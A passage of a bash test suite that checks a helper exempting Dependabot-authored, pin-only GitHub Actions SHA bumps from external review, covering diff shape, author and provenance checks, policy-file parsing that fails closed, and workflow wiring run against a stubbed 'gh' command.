      PIN_FILES="${files/#-/$PIN_DIR/files-real.json}" PIN_MODE="$mode" \
      bash "$PIN_HELPER" --repo owner/repo --pr 1 ${files_arg[@]+"${files_arg[@]}"} "$@" )
}

pin_case() {  # <label> <expected rc> <expected status> <reason substring> <pr> <commits> <files|-> <mode> [args...]
  local label=$1 want_rc=$2 want_status=$3 want_reason=$4
  shift 4
  local out rc=0 status reason
  set +e
  out=$(run_pin "$@" 2>"$PIN_DIR/stderr")
  rc=$?
  set -e
  status=$(printf '%s' "$out" | jq -r '.status // "<no json>"' 2>/dev/null || echo '<no json>')
  reason=$(printf '%s' "$out" | jq -r '.reason // ""' 2>/dev/null || true)
  if [ "$rc" -eq "$want_rc" ] && [ "$status" = "$want_status" ] && [[ "$reason" == *"$want_reason"* ]]; then
    pass "pin-bump: $label"
  else
    fail "pin-bump: $label (rc=$rc want $want_rc; status=$status want $want_status; reason=$reason; stderr=$(cat "$PIN_DIR/stderr"))"
  fi
  # The helper's JSON report, for callers that assert on its shape.
  printf '%s' "$out" >"$PIN_DIR/last.json"
}

# Write a files fixture and print its path, so a case can inline its payload.
pin_fixture() {  # <name> <entry json>...
  local name=$1
  shift
  pin_files "$@" >"$PIN_DIR/files-$name.json"
  printf '%s' "$PIN_DIR/files-$name.json"
}

pin_fixture real "$(pin_file .github/workflows/codex-feedback-archive-relay.yml "$PATCH_REAL" 1 1)" >/dev/null
pin_fixture two "$(pin_file .github/workflows/ci.yml "$PATCH_TWO" 2 2)" \
  "$(pin_file .github/workflows/release.yaml "$PATCH_REAL" 1 1)" >/dev/null

# --- exempt ----------------------------------------------------------------
pin_case "the real #2133 one-line SHA pin bump is exempt" 0 exempt "1 pin(s) across 1 workflow file(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok \
  --head "$PIN_HEAD" --base "$PIN_BASE" --config "$ROOT/.github/review-policy.yml"
if jq -e --arg h "$PIN_HEAD" --arg b "$PIN_BASE" '
     .exempt == true and .head == $h and .base == $b and .author == "dependabot[bot]" and .pins == 1
     and .files == [{filename:".github/workflows/codex-feedback-archive-relay.yml", pins:1}]
     and (.provenance | test("signature verified"))' "$PIN_DIR/last.json" >/dev/null; then
  pass "pin-bump: the exempt report names the verified pair, the provenance verdict and the pinned files"
else
  fail "pin-bump: exempt report shape is wrong: $(cat "$PIN_DIR/last.json")"
fi
if grep -Fxq 'api --paginate repos/owner/repo/pulls/1/commits?per_page=100' "$PIN_DIR/gh.log" \
   && [ "$(grep -c '^api repos/owner/repo/pulls/1$' "$PIN_DIR/gh.log")" -eq 2 ] \
   && ! grep -Fq 'pulls/1/files' "$PIN_DIR/gh.log"; then
  pass "pin-bump: provenance is read paginated, the live pair is read before and after the proof, and a cached files payload is not refetched"
else
  fail "pin-bump: unexpected gh call shape: $(cat "$PIN_DIR/gh.log")"
fi

pin_case "several pins across two files, list-item and tag forms included, are exempt" 0 exempt "3 pin(s) across 2 workflow file(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-two.json" ok >/dev/null

pin_case "without --files-json the files list is fetched and bound to the live head" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" - ok >/dev/null
if grep -Fxq 'api --paginate repos/owner/repo/pulls/1/files?per_page=100' "$PIN_DIR/gh.log"; then
  pass "pin-bump: the uncached files read is paginated"
else
  fail "pin-bump: files read is not the paginated endpoint: $(cat "$PIN_DIR/gh.log")"
fi

# --- not exempt: diff shape --------------------------------------------------
pin_case "a new step in the same hunk is not exempt" 1 not-exempt "a pin bump replaces lines one for one" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture new-step "$(pin_file .github/workflows/ci.yml "$PATCH_NEW_STEP" 2 1)")" ok >/dev/null
pin_case "a file-balanced but hunk-unbalanced diff is not exempt" 1 not-exempt "hunk 1 removes 1 line(s) but adds 2" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture unbalanced "$(pin_file .github/workflows/ci.yml "$PATCH_UNBALANCED" 2 2)")" ok >/dev/null
pin_case "a changed uses: target is not exempt" 1 not-exempt "changes the uses: target" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture target "$(pin_file .github/workflows/ci.yml "$PATCH_TARGET" 1 1)")" ok >/dev/null
pin_case "a with: value change is not exempt" 1 not-exempt "not an action pin" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture with "$(pin_file .github/workflows/ci.yml "$PATCH_WITH" 1 1)")" ok >/dev/null
pin_case "a permissions change is not exempt" 1 not-exempt "not an action pin" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture perm "$(pin_file .github/workflows/ci.yml "$PATCH_PERMISSIONS" 1 1)")" ok >/dev/null
pin_case "a pin bump mixed with a non-pin hunk in another file is not exempt" 1 not-exempt "not an action pin" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture mixed "$(pin_file .github/workflows/a.yml "$PATCH_REAL" 1 1)" "$(pin_file .github/workflows/b.yml "$PATCH_WITH" 1 1)")" ok >/dev/null
pin_case "a re-indented pin line is not exempt" 1 not-exempt "changes the uses: target" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture indent "$(pin_file .github/workflows/ci.yml "$PATCH_INDENT" 1 1)")" ok >/dev/null
pin_case "an end-of-file newline change is not exempt" 1 not-exempt "end-of-file newline" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture eof "$(pin_file .github/workflows/ci.yml "$PATCH_EOF" 1 1)")" ok >/dev/null
pin_case "a pin bump outside .github/workflows is not exempt" 1 not-exempt "not a .github/workflows/*.yml file" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture action "$(pin_file .github/actions/local/action.yml "$PATCH_REAL" 1 1)")" ok >/dev/null
pin_case "a pin bump plus a non-workflow file is not exempt" 1 not-exempt "package.json is not a .github/workflows/*.yml file" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture pkg "$(pin_file .github/workflows/a.yml "$PATCH_REAL" 1 1)" "$(pin_file package.json "$PATCH_WITH" 1 1)")" ok >/dev/null
pin_case "an added workflow file is not exempt" 1 not-exempt "status added, not modified" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture added "$(pin_file .github/workflows/new.yml "$PATCH_REAL" 1 0 added)")" ok >/dev/null
pin_case "a renamed workflow file is not exempt" 1 not-exempt "is a rename" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture renamed "$(pin_file .github/workflows/new.yml "$PATCH_REAL" 1 1 renamed "$PIN_HEAD" .github/workflows/old.yml)")" ok >/dev/null
pin_case "a file whose patch the API omitted is not exempt" 1 not-exempt "has no patch text" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture nopatch "$(pin_file .github/workflows/ci.yml "" 1 1)")" ok >/dev/null
pin_case "a files list that disagrees with its own patch is not exempt" 1 not-exempt "1 pin pair(s) in the patch but the API reports 2" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture miscount "$(pin_file .github/workflows/ci.yml "$PATCH_REAL" 2 2)")" ok >/dev/null
printf '[]\n' >"$PIN_DIR/files-empty.json"
pin_case "an empty files list is not exempt" 1 not-exempt "changes no files" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-empty.json" ok >/dev/null

# --- not exempt: who, not what ---------------------------------------------
pin_case "a non-Dependabot author is not exempt before any proof is attempted" 1 not-exempt "not dependabot[bot]" \
  "$PIN_DIR/pr-human.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok >/dev/null
if ! grep -Fq 'pulls/1/commits' "$PIN_DIR/gh.log"; then
  pass "pin-bump: a non-Dependabot author short-circuits before the provenance read"
else
  fail "pin-bump: provenance was read for a non-Dependabot author"
fi
pin_case "a lookalike login is not dependabot[bot]" 1 not-exempt "'dependabot-lookalike', not dependabot[bot]" \
  "$PIN_DIR/pr-lookalike.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok >/dev/null
pin_case "a foreign commit on the branch is not exempt even with a pin-only diff" 1 not-exempt "not Dependabot-only" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-foreign.json" "$PIN_DIR/files-real.json" ok >/dev/null
printf 'dependabot:\n  reviewer_gate:\n    enabled: true\n  pin_bump_exemption:\n    enabled: false  # opted out\n' >"$PIN_DIR/policy-off.yml"
pin_case "a governing policy that opts out is honored" 1 not-exempt "opted out" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-off.yml" >/dev/null
printf 'dependabot:\n  pin_bump_exemption:\n    enabled: "true"\n' >"$PIN_DIR/policy-quoted.yml"
pin_case "a quoted enabled: \"true\" still enables the lane" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-quoted.yml" >/dev/null
printf 'dependabot:\n  pin_bump_exemption:\n    enabled: true\n' >"$PIN_DIR/policy-on.yml"
pin_case "a bare enabled: true still enables the lane" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-on.yml" >/dev/null
printf 'dependabot:\n  pin_bump_exemption:\n    enabled: "false"\n' >"$PIN_DIR/policy-quoted-off.yml"
pin_case "a quoted enabled: \"false\" still opts out" 1 not-exempt "opted out" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-quoted-off.yml" >/dev/null
printf 'dependabot:\n  reviewer_gate:\n    enabled: true\n' >"$PIN_DIR/policy-absent.yml"
pin_case "an absent pin_bump_exemption block defaults to enabled" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-absent.yml" >/dev/null
printf 'dependabot:\n  pin_bump_exemption: {}\n' >"$PIN_DIR/policy-absent-enabled.yml"
pin_case "an absent enabled key in an existing block defaults to enabled" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-absent-enabled.yml" >/dev/null
# Explicit null is not an absent key (#2180): every YAML spelling must fail
# closed before the provenance or diff proof can establish an exemption.
for null_value in '' null '~'; do
  printf 'dependabot:\n  pin_bump_exemption:\n    enabled: %s\n' "$null_value" >"$PIN_DIR/policy-null.yml"
  pin_case "a present null enabled value '$null_value' fails closed" 3 unreadable "must be true or false" \
    "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-null.yml" >/dev/null
done
printf '"dependabot": {"pin_bump_exemption": {"enabled": null}}\n' >"$PIN_DIR/policy-flow-null.yml"
pin_case "a quoted-key flow-style null fails closed" 3 unreadable "must be true or false" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-flow-null.yml" >/dev/null
printf 'dependabot:\n  pin_bump_exemption:\n    enabled: maybe\n' >"$PIN_DIR/policy-bad.yml"
pin_case "a malformed enabled: value fails closed as unreadable" 3 unreadable "must be true or false" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-bad.yml" >/dev/null
# The opt-out is read through the shared structured parser: flow style and
# quoted keys are valid YAML and must be honored, not silently defaulted.
printf 'dependabot: { reviewer_gate: { enabled: true }, pin_bump_exemption: { enabled: false } }\n' >"$PIN_DIR/policy-flow.yml"
pin_case "a flow-style opt-out is honored" 1 not-exempt "opted out" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-flow.yml" >/dev/null
printf '"dependabot":\n  "pin_bump_exemption":\n    "enabled": false\n' >"$PIN_DIR/policy-quoted-keys.yml"
pin_case "a quoted-key opt-out is honored" 1 not-exempt "opted out" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-quoted-keys.yml" >/dev/null
printf 'dependabot: [not, a, mapping]\n' >"$PIN_DIR/policy-shape.yml"
pin_case "a dependabot block of the wrong shape fails closed as unreadable" 3 unreadable "must be true or false" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-shape.yml" >/dev/null
printf 'dependabot: {pin_bump_exemption: {enabled: false}\n' >"$PIN_DIR/policy-broken.yml"
pin_case "an unparseable policy fails closed as unreadable rather than defaulting to enabled" 3 unreadable "could not be parsed" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-broken.yml" >/dev/null
# The lane carves out only the protected-path rule: a diff at or above the
# governing threshold is not exempt however pin-shaped it is.
printf 'external_review_threshold: 2\n' >"$PIN_DIR/policy-threshold.yml"
pin_case "a pin-only diff at or above external_review_threshold is not exempt" 1 not-exempt "at or above external_review_threshold 2" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-threshold.yml" >/dev/null
printf 'external_review_threshold: 3\n' >"$PIN_DIR/policy-threshold-3.yml"
pin_case "a pin-only diff under the threshold stays exempt" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-threshold-3.yml" >/dev/null
# The count honors the labeler's generated-file exclusion, read from the
# canonical constant in external_review_fingerprint.sh rather than a copy.
EXCLUDE_FROM_FINGERPRINT=$(sed -n "s/^EXCLUDE_RE='\(.*\)'\$/\1/p" "$ROOT/scripts/workflow/external_review_fingerprint.sh" | head -1)
if [ -n "$EXCLUDE_FROM_FINGERPRINT" ] && [[ "$EXCLUDE_FROM_FINGERPRINT" == *'generated'* ]]; then
  pass "pin-bump: the fingerprint exclusion constant is readable in the shape the helper expects"
else
  fail "pin-bump: could not read EXCLUDE_RE from external_review_fingerprint.sh (got '$EXCLUDE_FROM_FINGERPRINT')"
fi
pin_case "a pin bump in a generated workflow is excluded from the threshold count, as the labeler excludes it" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture generated "$(pin_file .github/workflows/deploy.generated.yml "$PATCH_REAL" 1 1)")" ok --config "$PIN_DIR/policy-threshold.yml" >/dev/null
# Only the broad .github/** rule is carved out: a consumer that protects a
# specific workflow, or any other pattern, keeps that review.
printf 'external_review_paths:\n  - ".github/**"\n  - ".github/workflows/deploy.yml"\n' >"$PIN_DIR/policy-narrow.yml"
pin_case "a pin bump in a separately protected workflow is not exempt" 1 not-exempt "matches protected path pattern '.github/workflows/deploy.yml'" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture deploy "$(pin_file .github/workflows/deploy.yml "$PATCH_REAL" 1 1)")" ok --config "$PIN_DIR/policy-narrow.yml" >/dev/null
pin_case "a pin bump in a workflow covered only by the broad rule stays exempt beside a narrower pattern" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-narrow.yml" >/dev/null
for matcher_mode in matcher-fails matcher-partial-fails; do
  pin_case "a failed narrower matcher ($matcher_mode) is unreadable, regardless of stdout" 3 unreadable "protected path matcher failed (rc=43)" \
    "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" "$matcher_mode" --config "$PIN_DIR/policy-narrow.yml" >/dev/null
done
printf 'external_review_paths:\n  - ".github/workflows/**"\n  - "**/*secret*"\n' >"$PIN_DIR/policy-secret.yml"
pin_case "a pin bump in a workflow matching another protected pattern is not exempt" 1 not-exempt "matches protected path pattern '**/*secret*'" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture secrets "$(pin_file .github/workflows/rotate-secrets.yml "$PATCH_REAL" 1 1)")" ok --config "$PIN_DIR/policy-secret.yml" >/dev/null
pin_case "the .github/workflows/** spelling of the broad rule is carved out too" 0 exempt "1 pin(s)" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-secret.yml" >/dev/null
printf 'external_review_paths: everything\n' >"$PIN_DIR/policy-paths-bad.yml"
pin_case "a malformed external_review_paths fails closed as unreadable" 3 unreadable "not a list of strings" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-paths-bad.yml" >/dev/null
printf 'external_review_threshold: lots\n' >"$PIN_DIR/policy-threshold-bad.yml"
pin_case "a malformed threshold fails closed as unreadable" 3 unreadable "external_review_threshold must be a non-negative integer" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-threshold-bad.yml" >/dev/null

# --- unreadable: no verdict, fail closed ----------------------------------
pin_case "an unreadable commits list is not a verdict" 3 unreadable "could not be verified" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" unreadable-commits >/dev/null
pin_case "an unreadable files list is not a verdict" 3 unreadable "failed to fetch PR files" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" - unreadable-files >/dev/null
pin_case "an unreadable live PR is not a verdict" 3 unreadable "failed to read PR" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" pr-read-fails >/dev/null
pin_case "a live head that is not the pinned head is not a verdict" 3 unreadable "not the pinned head" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --head "$PIN_OTHER" >/dev/null
pin_case "a live base that is not the pinned base is not a verdict" 3 unreadable "not the pinned base" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --base "$PIN_OTHER" >/dev/null
pin_case "a head that moves during the proof is not a verdict" 3 unreadable "moved from" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" head-moves >/dev/null
pin_case "a files payload bound to another head is not a verdict" 3 unreadable "contents_url ref mismatch" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture otherhead "$(pin_file .github/workflows/ci.yml "$PATCH_REAL" 1 1 modified "$PIN_OTHER")")" ok >/dev/null
pin_case "a files payload with no head binding at all is not a verdict" 3 unreadable "contents_url ref mismatch" \
  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
  "$(pin_fixture unbound "$(pin_file .github/workflows/ci.yml "$PATCH_REAL" 1 1 | jq -c 'del(.contents_url)')")" ok >/dev/null

# Usage errors are neither verdicts nor unreadable reads.
set +e
( cd "$ROOT" && bash "$PIN_HELPER" --repo owner/repo --pr 1 --head short >/dev/null 2>&1 ); rc=$?
set -e
if [ "$rc" -eq 2 ]; then
  pass "pin-bump: a malformed --head is a usage error (rc 2)"
else
  fail "pin-bump: malformed --head rc=$rc, want 2"
fi

# ---------------------------------------------------------------------------
# Workflow wiring for the lane (#2164). The labeler must run the helper from
# the TRUSTED helper tree with the governing base config and its already-
# fetched files payload, carve out only the protected-path reason, and never
# remove a label; the trusted auto-clear path must run the helper from the
# default-branch checkout on BOTH clearing loops, before the merge-gate
# evaluation, mapping an unreachable verdict to the infrastructure sentinel.
# ---------------------------------------------------------------------------
PRP_WORKFLOW="${PRP_WORKFLOW:-$ROOT/.github/workflows/pr-review-policy.yml}"
AUTO_CLEAR_WORKFLOW="$ROOT/.github/workflows/auto-clear-blocking-labels.yml"
if command -v yq >/dev/null 2>&1 && [ -r "$PRP_WORKFLOW" ] && [ -r "$AUTO_CLEAR_WORKFLOW" ]; then
  CLASSIFIER=$(yq -r '.jobs."external-review-labeling".steps[] | select(.id == "check") | .run' "$PRP_WORKFLOW")
  if grep -Fq 'PIN_HELPER="$TRUSTED_HELPER_DIR/dependabot_pin_bump_exemption.sh"' <<<"$CLASSIFIER" \
     && grep -Fq -- '--config "$TRUSTED_CONFIG"' <<<"$CLASSIFIER" \
     && grep -Fq -- '--files-json "$FILES_JSON"' <<<"$CLASSIFIER" \
     && grep -Fq -- '--head "$HEAD_SHA"' <<<"$CLASSIFIER" \
     && grep -Fq -- '--base "$BASE_SHA"' <<<"$CLASSIFIER" \
     && grep -Fq "[ \"\$PR_AUTHOR\" = 'dependabot[bot]' ]" <<<"$CLASSIFIER"; then
    pass "labeler runs the pin-bump helper from the trusted helper tree, pinned to the event pair, with the governing base config"
  else
    fail "labeler must invoke dependabot_pin_bump_exemption.sh from \$TRUSTED_HELPER_DIR with --head/--base/--config/--files-json"
  fi
  if grep -Fq '(.lines_changed < .threshold) and (.reasons | length) == 1 and (.reasons[0] | startswith("protected paths modified: "))' <<<"$CLASSIFIER"; then
    pass "labeler carves out only the protected-path reason (threshold and capped reads keep the label)"
  else
    fail "labeler must require the protected-path rule to be the ONLY external-review reason before consulting the lane"
  fi
  if ! grep -Fq -- '--remove-label' <<<"$CLASSIFIER"; then
    pass "labeler classifier removes no label on the pin-bump path"
  else
    fail "the classifier body must not remove labels"
  fi
  # The exempt arm publishes a no-review classification and stops before the
  # carry-forward and clearance logic; its evidence travels on a step output.
  exempt_arm=$(awk '/Dependabot pin-bump lane: VERIFIED at head/{f=1} f{print} f && /^[[:space:]]*;;[[:space:]]*$/{exit}' <<<"$CLASSIFIER")
  if grep -Fq 'echo "needs_review=false" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
     && grep -Fq 'echo "classification=dependabot-pin-bump" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
     && grep -Fq 'echo "dependabot_pin_bump=true" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
     && grep -Fq 'echo "dependabot_pin_bump_evidence=$PIN_JSON" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
     && grep -Fq '>> "${GITHUB_STEP_SUMMARY:-/dev/stderr}"' <<<"$exempt_arm" \
     && grep -Eq '^[[:space:]]*exit 0[[:space:]]*$' <<<"$exempt_arm"; then
    pass "labeler's exempt arm classifies dependabot-pin-bump, exports the evidence, writes the check summary and stops"
  else
    fail "labeler's exempt arm is incomplete: $exempt_arm"
  fi
  LANE_IF=$(yq -r '.jobs."external-review-labeling".steps[] | select(.name == "Dependabot action-pin bump lane") | .if' "$PRP_WORKFLOW")
  LANE_TOKEN=$(yq -r '.jobs."external-review-labeling".steps[] | select(.name == "Dependabot action-pin bump lane") | .env.GH_TOKEN' "$PRP_WORKFLOW")
  LANE_RUN=$(yq -r '.jobs."external-review-labeling".steps[] | select(.name == "Dependabot action-pin bump lane") | .run' "$PRP_WORKFLOW")
  if [ "$LANE_IF" = "steps.check.outputs.dependabot_pin_bump == 'true'" ] \
     && [ "$LANE_TOKEN" = '${{ secrets.GITHUB_TOKEN }}' ] \
     && ! grep -Fq -- '--remove-label' <<<"$LANE_RUN" \
     && ! grep -Fq 'DELETE' <<<"$LANE_RUN" \
     && ! grep -Fq 'LABEL_REMOVAL_TOKEN' <<<"$LANE_RUN" \
     && grep -Fq 'gh api --paginate "repos/$REPO/issues/$PR_NUMBER/comments"' <<<"$LANE_RUN"; then
    pass "labeler's diagnostic step runs only on an exempt classification, under GITHUB_TOKEN, paginates its dedupe read and removes nothing"
  else
    fail "labeler's diagnostic step must be gated on the exempt output, GITHUB_TOKEN-only, paginated and write-free apart from its marker comment"
  fi

  # Execute the diagnostic step against a stubbed gh: one marker per pair,
  # fenced on the live pair, never a label write.
  LANE_DIR="$WORK/lane"
  mkdir -p "$LANE_DIR/bin"
  printf '%s\n' "$LANE_RUN" >"$LANE_DIR/step.sh"
  cat >"$LANE_DIR/bin/gh" <<'SHIM'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$*" >>"$LANE_LOG"
case "$*" in
  "api --paginate repos/owner/repo/issues/1/comments --jq .[].body")
    cat "$LANE_COMMENTS" ;;
  "api repos/owner/repo/pulls/1 --jq {head:.head.sha,base:.base.sha}")
    [ "${LANE_MODE:-}" != pair-read-fails ] || exit 1
    cat "$LANE_PAIR" ;;
  "pr comment 1 --repo owner/repo --body-file "*)
    [ "${LANE_MODE:-}" != comment-refused ] || { echo "HTTP 403: Resource not accessible by integration" >&2; exit 1; }
    cat "$7" >>"$LANE_DIR/comment-writes"
    printf '\n---\n' >>"$LANE_DIR/comment-writes" ;;
  *) echo "gh shim: unexpected command: $*" >&2; exit 90 ;;
esac
SHIM
  chmod +x "$LANE_DIR/bin/gh"
  run_lane() {  # <comments file> <pair file> <mode> <evidence json>
    : >"$LANE_DIR/gh.log"
    rm -f "$LANE_DIR/comment-writes"
    env PATH="$LANE_DIR/bin:$PATH" LANE_LOG="$LANE_DIR/gh.log" LANE_DIR="$LANE_DIR" \
        LANE_COMMENTS="$1" LANE_PAIR="$2" LANE_MODE="$3" EVIDENCE="$4" \
        GH_TOKEN=fake PR_NUMBER=1 REPO=owner/repo HEAD_SHA="$PIN_HEAD" BASE_SHA="$PIN_BASE" \
        bash "$LANE_DIR/step.sh" >"$LANE_DIR/out" 2>"$LANE_DIR/err"
  }
  LANE_EVIDENCE=$(cat "$PIN_DIR/last.json" 2>/dev/null || true)
  if ! jq -e '.exempt == true' <<<"$LANE_EVIDENCE" >/dev/null 2>&1; then
    # Re-derive a known-exempt report for the harness.
    pin_case "harness evidence: the real pin bump is exempt" 0 exempt "1 pin(s)" \
      "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok >/dev/null
    LANE_EVIDENCE=$(cat "$PIN_DIR/last.json")
  fi
  LANE_MARKER="<!-- mergepath-dependabot-pin-bump:v1 verified-head=$PIN_HEAD verified-base=$PIN_BASE -->"
  : >"$LANE_DIR/no-comments.txt"
  printf '%s\n' "some earlier comment" "$LANE_MARKER" >"$LANE_DIR/marker-present.txt"
  jq -n --arg h "$PIN_HEAD" --arg b "$PIN_BASE" '{head:$h,base:$b}' >"$LANE_DIR/pair-current.json"
  jq -n --arg h "$PIN_OTHER" --arg b "$PIN_BASE" '{head:$h,base:$b}' >"$LANE_DIR/pair-moved.json"
  printf '{"head":"nope","base":"%s"}\n' "$PIN_BASE" >"$LANE_DIR/pair-malformed.json"

  if run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-current.json" ok "$LANE_EVIDENCE" \
     && grep -Fq "$LANE_MARKER" "$LANE_DIR/comment-writes" \
     && grep -Fq 'signature verified' "$LANE_DIR/comment-writes" \
     && grep -Fq 'codex-feedback-archive-relay.yml' "$LANE_DIR/comment-writes" \
     && [ "$(grep -c -- '---' "$LANE_DIR/comment-writes")" -eq 1 ] \
     && ! grep -Eq 'remove-label|DELETE' "$LANE_DIR/gh.log"; then
    pass "diagnostic step posts one marker comment naming the pair, the provenance and the pinned file, and touches no label"
  else
    fail "diagnostic step did not publish as expected (out=$(cat "$LANE_DIR/out") err=$(cat "$LANE_DIR/err") log=$(cat "$LANE_DIR/gh.log"))"
  fi
  if run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-current.json" comment-refused "$LANE_EVIDENCE" \
     && [ ! -f "$LANE_DIR/comment-writes" ] \
     && grep -Fq '::warning::Could not publish optional pin-bump diagnostic marker.' "$LANE_DIR/out" \
     && [ "$(grep -c '^pr comment ' "$LANE_DIR/gh.log")" -eq 1 ]; then
    pass "diagnostic comment refusal warns once without failing a valid pin-bump lane"
  else
    fail "optional diagnostic refusal changed the valid lane verdict (out=$(cat "$LANE_DIR/out") err=$(cat "$LANE_DIR/err"))"
  fi
  if run_lane "$LANE_DIR/marker-present.txt" "$LANE_DIR/pair-current.json" ok "$LANE_EVIDENCE" \
     && [ ! -f "$LANE_DIR/comment-writes" ]; then
    pass "diagnostic step is idempotent per verified pair"
  else
    fail "diagnostic step re-posted or failed with a marker already present (err=$(cat "$LANE_DIR/err"))"
  fi
  if run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-moved.json" ok "$LANE_EVIDENCE" \
     && [ ! -f "$LANE_DIR/comment-writes" ] && grep -Fq 'moved from' "$LANE_DIR/out"; then
    pass "diagnostic step skips a stale pair without writing"
  else
    fail "diagnostic step wrote or failed on a moved pair (out=$(cat "$LANE_DIR/out") err=$(cat "$LANE_DIR/err"))"
  fi
  set +e
  run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-current.json" pair-read-fails "$LANE_EVIDENCE"; rc_read=$?
